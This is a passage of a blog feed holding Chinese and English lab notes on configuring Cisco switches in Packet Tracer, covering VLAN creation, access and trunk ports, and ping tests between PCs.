192.168.20.1 即可ping通</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Request timed out.</span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">127</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.20</span><span class="number">.1</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">3</span>, Lost = <span class="number">1</span> (<span class="number">25</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure><h3 id="问题探究"><a href="#问题探究" class="headerlink" title="问题探究"></a>问题探究</h3><ul><li>为什么ping第一次的时候会出现一次超时？</li></ul><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>默认模式下，交换机工作在二层模式下，需要运行 no switchport 将其修改为三层模式。</p><p>交换机需要手动配置网络而路由器不用</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; title=&quot;准备&quot;&gt;&lt;/a&gt;准备&lt;/h1&gt;&lt;p&gt;在 Switch 中拖入 3560-24PS ，放入两个PC机，并在Connections中选择Copper Straight-Through连接Switch的GigabitEthernet 0/1、0/2和两台PC机的FastEthernet 0。&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="计算机网络原理" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/"/>
    
    <category term="学习" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="实验" scheme="https://guo.moe/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络原理实验二──二层交换机基本配置</title>
    <link href="https://guo.moe/archives/Principles-Of-Computer-Networks-Experiment-2.html"/>
    <id>https://guo.moe/archives/Principles-Of-Computer-Networks-Experiment-2.html</id>
    <published>2021-04-23T02:00:00.000Z</published>
    <updated>2021-04-29T01:56:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="预先准备"><a href="#预先准备" class="headerlink" title="预先准备"></a>预先准备</h1><p>先在 CPT(Cisco Packet Tracer) 上放置两个PC，两个Switch，然后将PC与各自的 Switch 通过  Copper Straight-Through 连接，交换机之间通过 Copper Cross-over 连接，此处两个 Switch 使用 2950-24 型号，将Switch的0/1口和PC进行连接，将Switch的0/24口相互连接。</p><p>我们的目的是将这四个设备划分在一个 VLAN(VLAN 10) 中。</p><span id="more"></span><h1 id="接口与-VLAN-配置"><a href="#接口与-VLAN-配置" class="headerlink" title="接口与 VLAN 配置"></a>接口与 VLAN 配置</h1><h2 id="查看vlan信息"><a href="#查看vlan信息" class="headerlink" title="查看vlan信息"></a>查看vlan信息</h2><p>双击 Switch 打开 CLI，默认是用户模式，输入enable进入特权模式，输入 show vlan 即可查看目前的VLAN状况，由此可见接口都默认接在VLAN1上。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Switch&gt;enable</span><br><span class="line">Switch#show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">1</span>, Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span></span><br><span class="line">                                                Fa0/<span class="number">5</span>, Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span></span><br><span class="line">                                                Fa0/<span class="number">9</span>, Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span></span><br><span class="line">                                                Fa0/<span class="number">13</span>, Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span></span><br><span class="line">                                                Fa0/<span class="number">17</span>, Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span></span><br><span class="line">                                                Fa0/<span class="number">21</span>, Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch#</span><br></pre></td></tr></table></figure><p>输入 show running-config 也可以查看目前接口配置情况，输入 show history 可以查看命令执行历史记录</p><h2 id="将接口划分到vlan"><a href="#将接口划分到vlan" class="headerlink" title="将接口划分到vlan"></a>将接口划分到vlan</h2><p>首先进入全局配置模式下，输入 configure terminal ，然后输入vlan 10创建新的vlan</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Switch#</span><br><span class="line">%SYS-<span class="number">5</span>-CONFIG_I: Configured <span class="keyword">from</span> <span class="built_in">console</span> by <span class="built_in">console</span></span><br><span class="line">configure terminal</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Switch(config)#vlan <span class="number">10</span></span><br><span class="line">Switch(config-vlan)#<span class="keyword">do</span> show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">1</span>, Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span></span><br><span class="line">                                                Fa0/<span class="number">5</span>, Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span></span><br><span class="line">                                                Fa0/<span class="number">9</span>, Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span></span><br><span class="line">                                                Fa0/<span class="number">13</span>, Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span></span><br><span class="line">                                                Fa0/<span class="number">17</span>, Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span></span><br><span class="line">                                                Fa0/<span class="number">21</span>, Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">10</span>   VLAN0010                         active    </span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">10</span>   enet  <span class="number">100010</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch(config-vlan)#〔筆畫〕</span><br></pre></td></tr></table></figure><p>可以看到上面多了一个vlan 10</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Switch(config-vlan)# interface fastEthernet <span class="number">0</span>/<span class="number">1</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport access vlan <span class="number">10</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#<span class="keyword">do</span> show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span>, Fa0/<span class="number">5</span></span><br><span class="line">                                                Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span>, Fa0/<span class="number">9</span></span><br><span class="line">                                                Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span>, Fa0/<span class="number">13</span></span><br><span class="line">                                                Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span>, Fa0/<span class="number">17</span></span><br><span class="line">                                                Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span>, Fa0/<span class="number">21</span></span><br><span class="line">                                                Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">10</span>   VLAN0010                         active    Fa0/<span class="number">1</span></span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">10</span>   enet  <span class="number">100010</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%CDP-<span class="number">4</span>-NATIVE_VLAN_MISMATCH: Native VLAN mismatch discovered on FastEthernet0/<span class="number">1</span> (<span class="number">10</span>), <span class="keyword">with</span> Switch FastEthernet0/<span class="number">1</span> (<span class="number">1</span>).</span><br></pre></td></tr></table></figure><p>然后修改 0/24 端口，此处要修改端口模式</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Switch(config-<span class="keyword">if</span>)#interface fastEthernet <span class="number">0</span>/<span class="number">24</span></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#switchport mode trunk</span><br><span class="line"></span><br><span class="line">Switch(config-<span class="keyword">if</span>)#</span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface FastEthernet0/<span class="number">24</span>, changed state to down</span><br><span class="line"></span><br><span class="line">%LINEPROTO-<span class="number">5</span>-UPDOWN: Line protocol on Interface FastEthernet0/<span class="number">24</span>, changed state to up</span><br></pre></td></tr></table></figure><h2 id="更改PC的IP地址"><a href="#更改PC的IP地址" class="headerlink" title="更改PC的IP地址"></a>更改PC的IP地址</h2><p>各配置192.168.1.1(2)，关闭保存，打开Command Prompt，尝试互相ping</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;ping <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span></span><br><span class="line"></span><br><span class="line">Pinging <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span> <span class="keyword">with</span> <span class="number">32</span> bytes <span class="keyword">of</span> data:</span><br><span class="line"></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=22ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time&lt;1ms TTL=<span class="number">128</span></span><br><span class="line">Reply <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>: bytes=<span class="number">32</span> time=1ms TTL=<span class="number">128</span></span><br><span class="line"></span><br><span class="line">Ping statistics <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.2</span>:</span><br><span class="line">    Packets: Sent = <span class="number">4</span>, Received = <span class="number">4</span>, Lost = <span class="number">0</span> (<span class="number">0</span>% loss),</span><br><span class="line">Approximate round trip times <span class="keyword">in</span> milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 22ms, Average = 5ms</span><br><span class="line"></span><br><span class="line"><span class="attr">C</span>:\&gt;</span><br></pre></td></tr></table></figure><p>配置成功</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="输错指令进入域名解析"><a href="#输错指令进入域名解析" class="headerlink" title="输错指令进入域名解析"></a>输错指令进入域名解析</h2><p>按 Ctrl+Shift+6 快捷键取消操作</p><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>First, let’s put two PCs and two switches(non-nintendo) in the Cisco Packet Tracer. The Cisco Packet Tracer can be downloaded <a href="https://www.netacad.com/zh-hans/courses/packet-tracer">here</a>. Then connect two PCs with their own switch by Copper Straight-Through Line. It is important to note that you should use Copper Cross-over Line to connect two switches. We use the switch model 2950-24 here. Connect FastEthernet 0/1 of the switch with the port of the PC, and then connect FastEthernet 0/24 of the two switches to each other.</p><h1 id="Configuration-of-Interface-and-VLAN"><a href="#Configuration-of-Interface-and-VLAN" class="headerlink" title="Configuration of Interface and VLAN"></a>Configuration of Interface and VLAN</h1><h2 id="View-the-information-about-VLAN"><a href="#View-the-information-about-VLAN" class="headerlink" title="View the information about VLAN"></a>View the information about VLAN</h2><p>Double Click one of the switches and switch to the tab of CLI. The default mode is User Mode. You should type “enable” to enter the privilege mode. You can type “show vlan” to view the situation of VLAN. By default, all interfaces are on vlan1.</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Switch&gt;enable</span><br><span class="line">Switch#show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">1</span>, Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span></span><br><span class="line">                                                Fa0/<span class="number">5</span>, Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span></span><br><span class="line">                                                Fa0/<span class="number">9</span>, Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span></span><br><span class="line">                                                Fa0/<span class="number">13</span>, Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span></span><br><span class="line">                                                Fa0/<span class="number">17</span>, Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span></span><br><span class="line">                                                Fa0/<span class="number">21</span>, Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span class="number">1003</span> token-ring-<span class="keyword">default</span>               active    </span><br><span class="line"><span class="number">1004</span> fddinet-<span class="keyword">default</span>                  active    </span><br><span class="line"><span class="number">1005</span> trnet-<span class="keyword">default</span>                    active    </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"><span class="number">1</span>    enet  <span class="number">100001</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span></span><br><span class="line"><span class="number">1002</span> fddi  <span class="number">101002</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1003</span> tr    <span class="number">101003</span>     <span class="number">1500</span>  -      -      -        -    -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1004</span> fdnet <span class="number">101004</span>     <span class="number">1500</span>  -      -      -        ieee -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"><span class="number">1005</span> trnet <span class="number">101005</span>     <span class="number">1500</span>  -      -      -        ibm  -        <span class="number">0</span>      <span class="number">0</span>   </span><br><span class="line"></span><br><span class="line">VLAN Type  SAID       MTU   Parent RingNo BridgeNo Stp  BrdgMode Trans1 Trans2</span><br><span class="line">---- ----- ---------- ----- ------ ------ -------- ---- -------- ------ ------</span><br><span class="line"></span><br><span class="line">Remote SPAN VLANs</span><br><span class="line">------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Primary Secondary Type              Ports</span><br><span class="line">------- --------- ----------------- ------------------------------------------</span><br><span class="line">Switch#</span><br></pre></td></tr></table></figure><p>To view the information of the current interface, type “show running-config”. To view the history of command execution, type “show history”.</p><h2 id="Divide-the-interface-into-a-custom-vlan"><a href="#Divide-the-interface-into-a-custom-vlan" class="headerlink" title="Divide the interface into a custom vlan"></a>Divide the interface into a custom vlan</h2><p>First, type “configure terminal” to enter the global configuration mode. Then type “vlan 10” to create a new vlan. Type “do show vlan” after that, you will find an additional vlan.</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Switch#</span><br><span class="line">%SYS-<span class="number">5</span>-CONFIG_I: Configured <span class="keyword">from</span> <span class="built_in">console</span> by <span class="built_in">console</span></span><br><span class="line">configure terminal</span><br><span class="line">Enter configuration commands, one per line.  End <span class="keyword">with</span> CNTL/Z.</span><br><span class="line">Switch(config)#vlan <span class="number">10</span></span><br><span class="line">Switch(config-vlan)#<span class="keyword">do</span> show vlan</span><br><span class="line"></span><br><span class="line">VLAN Name                             Status    Ports</span><br><span class="line">---- -------------------------------- --------- -------------------------------</span><br><span class="line"><span class="number">1</span>    <span class="keyword">default</span>                          active    Fa0/<span class="number">1</span>, Fa0/<span class="number">2</span>, Fa0/<span class="number">3</span>, Fa0/<span class="number">4</span></span><br><span class="line">                                                Fa0/<span class="number">5</span>, Fa0/<span class="number">6</span>, Fa0/<span class="number">7</span>, Fa0/<span class="number">8</span></span><br><span class="line">                                                Fa0/<span class="number">9</span>, Fa0/<span class="number">10</span>, Fa0/<span class="number">11</span>, Fa0/<span class="number">12</span></span><br><span class="line">                                                Fa0/<span class="number">13</span>, Fa0/<span class="number">14</span>, Fa0/<span class="number">15</span>, Fa0/<span class="number">16</span></span><br><span class="line">                                                Fa0/<span class="number">17</span>, Fa0/<span class="number">18</span>, Fa0/<span class="number">19</span>, Fa0/<span class="number">20</span></span><br><span class="line">                                                Fa0/<span class="number">21</span>, Fa0/<span class="number">22</span>, Fa0/<span class="number">23</span>, Fa0/<span class="number">24</span></span><br><span class="line"><span class="number">10</span>   VLAN0010                         active    </span><br><span class="line"><span class="number">1002</span> fddi-<span class="keyword">default</span>                     active    </span><br><span class="line"><span 